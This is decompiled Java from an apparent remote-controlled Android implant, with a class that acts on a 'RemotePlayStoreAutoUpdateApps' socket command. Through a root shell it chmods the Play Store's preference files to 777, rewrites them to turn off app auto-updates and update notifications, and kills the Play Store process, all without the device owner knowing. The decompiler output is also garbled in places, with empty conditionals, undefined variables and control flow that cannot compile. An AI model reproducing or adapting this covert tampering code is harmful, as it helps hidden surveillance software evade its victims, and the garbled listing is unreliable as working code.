    //   53: new 349	java/io/FileReader
    //   56: astore 8
    //   58: aload 8
    //   60: aload 5
    //   62: invokespecial 350	java/io/FileReader:<init>	(Ljava/io/File;)V
    //   65: aload_3
    //   66: aload 8
    //   68: invokespecial 284	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   71: aload_3
    //   72: invokevirtual 287	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   75: astore 4
    //   77: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   80: istore 9
    //   82: iload 9
    //   84: ifeq +3 -> 87
    //   87: aload 4
    //   89: ifnull +31 -> 120
    //   92: aload 4
    //   94: invokevirtual 353	java/lang/String:trim	()Ljava/lang/String;
    //   97: astore 4
    //   99: ldc_w 355
    //   102: astore 5
    //   104: aload 4
    //   106: aload 5
    //   108: invokevirtual 358	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   111: istore 7
    //   113: iload 7
    //   115: ifeq +5 -> 120
    //   118: iconst_1
    //   119: istore_1
    //   120: aload_3
    //   121: invokestatic 300	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   124: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   127: istore 6
    //   129: iload 6
    //   131: ifeq +3 -> 134
    //   134: iload_1
    //   135: ireturn
    //   136: astore_3
    //   137: iconst_0
    //   138: istore 6
    //   140: aconst_null
    //   141: astore_3
    //   142: getstatic 38	com/vvt/playstore/autoupdateapps/removeFromPath:MyUncaughtExceptionHandler	Z
    //   145: istore 7
    //   147: iload 7
    //   149: ifeq -29 -> 120
    //   152: goto -32 -> 120
    //   155: astore_2
    //   156: iconst_0
    //   157: istore 6
    //   159: aconst_null
    //   160: astore_3
    //   161: aload_3
    //   162: invokestatic 300	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   165: aload_2
    //   166: athrow
    //   167: getstatic 34	com/vvt/playstore/autoupdateapps/removeFromPath:removeFromPath	Z
    //   170: istore 6
    //   172: iload 6
    //   174: ifeq -50 -> 124
    //   177: goto -53 -> 124
    //   180: astore_2
    //   181: goto -20 -> 161
    //   184: astore 4
    //   186: goto -44 -> 142
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	189	0	this	removeFromPath
    //   1	134	1	bool1	boolean
    //   3	1	2	localObject1	Object
    //   155	11	2	localObject2	Object
    //   180	1	2	localObject3	Object
    //   8	113	3	localObject4	Object
    //   136	1	3	localIOException1	IOException
    //   141	21	3	localBufferedReader	BufferedReader
    //   11	94	4	str	String
    //   184	1	4	localIOException2	IOException
    //   23	84	5	localObject5	Object
    //   36	137	6	bool2	boolean
    //   44	104	7	bool3	boolean
    //   56	11	8	localFileReader	java.io.FileReader
    //   80	3	9	bool4	boolean
    // Exception table:
    //   from	to	target	type
    //   49	52	136	java/io/IOException
    //   53	56	136	java/io/IOException
    //   60	65	136	java/io/IOException
    //   66	71	136	java/io/IOException
    //   49	52	155	finally
    //   53	56	155	finally
    //   60	65	155	finally
    //   66	71	155	finally
    //   71	75	180	finally
    //   77	80	180	finally
    //   92	97	180	finally
    //   106	111	180	finally
    //   142	145	180	finally
    //   71	75	184	java/io/IOException
    //   77	80	184	java/io/IOException
    //   92	97	184	java/io/IOException
    //   106	111	184	java/io/IOException
  }
  
  public Object a(TcpSocketCmd paramTcpSocketCmd)
  {
    boolean bool1 = false;
    Boolean localBoolean = null;
    boolean bool2 = paramTcpSocketCmd instanceof RemotePlayStoreAutoUpdateApps;
    if (bool2)
    {
      bool1 = a;
      if (bool1) {}
      a();
      bool1 = true;
      localBoolean = Boolean.valueOf(bool1);
    }
    return localBoolean;
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    bool = this.h;
    if (bool)
    {
      Timer localTimer = this.e;
      if (localTimer == null)
      {
        localTimer = new java/util/Timer;
        localTimer.<init>();
        this.e = localTimer;
        localTimer = this.e;
        c localc = new com/vvt/playstore/autoupdateapps/c;
        localc.<init>(this);
        long l1 = 100;
        long l2 = 5000L;
        localTimer.schedule(localc, l1, l2);
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(boolean paramBoolean)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    String str;
    if ((!bool) || (paramBoolean))
    {
      str = "1";
      a(str);
      bool = true;
      this.h = bool;
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      a("0");
      bool = false;
      str = null;
      this.h = false;
      f();
    }
  }
  
  public boolean b()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    String str = null;
    Object localObject = this.j;
    RunningMode localRunningMode = RunningMode.LIMITED_1;
    if (localObject != localRunningMode)
    {
      localObject = this.j;
      localRunningMode = RunningMode.FULL;
      if (localObject != localRunningMode) {}
    }
    else
    {
      str = p.a(this.g, "disable");
      localObject = new java/io/File;
      ((File)localObject).<init>(str);
      bool1 = ((File)localObject).exists();
      if (bool1) {}
    }
    for (;;)
    {
      try
      {
        ((File)localObject).createNewFile();
        bool1 = j();
        this.h = bool1;
        bool1 = g();
        bool2 = a;
        if (bool2) {}
        bool2 = a;
        if (bool2) {}
        return bool1;
      }
      catch (IOException localIOException)
      {
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      boolean bool2 = a;
      if (!bool2) {}
    }
  }
  
  public boolean c()
  {
    return this.h;
  }
  
  public boolean d()
  {
    boolean bool1 = true;
    try
    {
      boolean bool2 = a;
      if (bool2) {}
      bool2 = false;
      Object localObject1 = null;
      try
      {
        localObject1 = f.b();
        String str1;
        String str2;
        Object localObject4;
        boolean bool3;
        Object localObject5;
        String str3;
        int m;
        int n;
        String str4;
        if (localObject6 == null) {
          break label891;
        }
      }
      catch (CannotGetRootShellException localCannotGetRootShellException)
      {
        for (;;)
        {
          try
          {
            str1 = this.g;
            str2 = "finsky.xml";
            str1 = p.a(str1, str2);
            str2 = "/data/data/com.android.vending/shared_prefs/finsky.xml";
            localObject4 = "777";
            bool3 = a(str2, str1, (String)localObject4, (f)localObject1);
            if (bool3)
            {
              localObject4 = this.k;
              localObject5 = this.k;
              b((String)localObject4, (String)localObject5, str1, (f)localObject1);
              localObject4 = new com/vvt/playstore/autoupdateapps/d;
              ((d)localObject4).<init>(this);
              ((d)localObject4).a(str1);
              localObject5 = "auto_update_enabled";
              str3 = "false";
              ((d)localObject4).a((String)localObject5, str3);
              localObject5 = "update_over_wifi_only";
              str3 = "false";
              ((d)localObject4).a((String)localObject5, str3);
              a((d)localObject4);
              localObject4 = "%s -l '%s'";
              m = 2;
              localObject5 = new Object[m];
              n = 0;
              str3 = null;
              str4 = "/system/bin/ls";
              localObject5[0] = str4;
              n = 1;
              localObject5[n] = str2;
              localObject4 = String.format((String)localObject4, (Object[])localObject5);
              localObject4 = ((f)localObject1).a((String)localObject4);
              localObject4 = b((String)localObject4);
              localObject5 = "777";
              a(str1, str2, (String)localObject5, (f)localObject1);
              str1 = ((com.vvt.io.c)localObject4).h;
              if (str1 != null)
              {
                str1 = ((com.vvt.io.c)localObject4).i;
                if (str1 != null)
                {
                  str1 = ((com.vvt.io.c)localObject4).h;
                  localObject4 = ((com.vvt.io.c)localObject4).i;
                  b(str1, (String)localObject4, str2, (f)localObject1);
                }
              }
            }
            str1 = this.g;
            str2 = "com.android.vending_preferences.xml";
            str1 = p.a(str1, str2);
            str2 = "/data/data/com.android.vending/shared_prefs/com.android.vending_preferences.xml";
            localObject4 = "777";
            bool3 = a(str2, str1, (String)localObject4, (f)localObject1);
            if (bool3)
            {
              localObject4 = this.k;
              localObject5 = this.k;
              b((String)localObject4, (String)localObject5, str1, (f)localObject1);
              localObject4 = new com/vvt/playstore/autoupdateapps/d;
              ((d)localObject4).<init>(this);
              ((d)localObject4).a(str1);
              localObject5 = "update-notifications";
              str3 = "false";
              ((d)localObject4).a((String)localObject5, str3);
              localObject5 = "auto-update-mode";
              str3 = "AUTO_UPDATE_NEVER";
              ((d)localObject4).b((String)localObject5, str3);
              a((d)localObject4);
              localObject4 = "%s -l '%s'";
              m = 2;
              localObject5 = new Object[m];
              n = 0;
              str3 = null;
              str4 = "/system/bin/ls";
              localObject5[0] = str4;
              n = 1;
              localObject5[n] = str2;
              localObject4 = String.format((String)localObject4, (Object[])localObject5);
              localObject4 = ((f)localObject1).a((String)localObject4);
              localObject4 = b((String)localObject4);
              localObject5 = "777";
              a(str1, str2, (String)localObject5, (f)localObject1);
              str1 = ((com.vvt.io.c)localObject4).h;
              if (str1 != null)
              {
                str1 = ((com.vvt.io.c)localObject4).i;
                if (str1 != null)
                {
                  str1 = ((com.vvt.io.c)localObject4).h;
                  localObject4 = ((com.vvt.io.c)localObject4).i;
                  b(str1, (String)localObject4, str2, (f)localObject1);
                }
              }
            }
            str1 = this.g;
            str2 = "vending_preferences.xml";
            str1 = p.a(str1, str2);
            str2 = "/data/data/com.android.vending/shared_prefs/vending_preferences.xml";
            localObject4 = "777";
            bool3 = a(str2, str1, (String)localObject4, (f)localObject1);
            if (bool3)
            {
              localObject4 = this.k;
              localObject5 = this.k;
              b((String)localObject4, (String)localObject5, str1, (f)localObject1);
              localObject4 = new com/vvt/playstore/autoupdateapps/d;
              ((d)localObject4).<init>(this);
              ((d)localObject4).a(str1);
              localObject5 = "notify_updates";
              str3 = "false";
              ((d)localObject4).a((String)localObject5, str3);
              a((d)localObject4);
              localObject4 = "%s -l '%s'";
              m = 2;
              localObject5 = new Object[m];
              n = 0;
              str3 = null;
              str4 = "/system/bin/ls";
              localObject5[0] = str4;
              n = 1;
              localObject5[n] = str2;
              localObject4 = String.format((String)localObject4, (Object[])localObject5);
              localObject4 = ((f)localObject1).a((String)localObject4);
              localObject4 = b((String)localObject4);
              localObject5 = "777";
              a(str1, str2, (String)localObject5, (f)localObject1);
              str1 = ((com.vvt.io.c)localObject4).h;
              if (str1 != null)
              {
                str1 = ((com.vvt.io.c)localObject4).i;
                if (str1 != null)
                {
                  str1 = ((com.vvt.io.c)localObject4).h;
                  localObject4 = ((com.vvt.io.c)localObject4).i;
                  b(str1, (String)localObject4, str2, (f)localObject1);
                }
              }
            }
            str1 = "com.android.vending";
            ShellUtil.d(str1);
            if (localObject1 != null) {
              ((f)localObject1).d();
            }
            bool2 = bool1;
            bool1 = a;
            if (bool1) {}
            bool1 = a;
            if (bool1) {}
            return bool2;
          }
          finally
          {
            Object localObject6 = localObject2;
            Object localObject3 = localObject8;
            continue;
          }
          localCannotGetRootShellException = localCannotGetRootShellException;
          bool1 = c;
          if ((!bool1) || (localObject1 != null)) {
            ((f)localObject1).d();
          }
          bool2 = false;
          localObject1 = null;
        }
      }
      finally
      {
        localObject7 = finally;
        bool1 = false;
        localObject6 = null;
        localObject1 = localObject7;
      }
      ((f)localObject6).d();
      label891:
      throw ((Throwable)localObject1);
    }
    finally {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/playstore/autoupdateapps/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */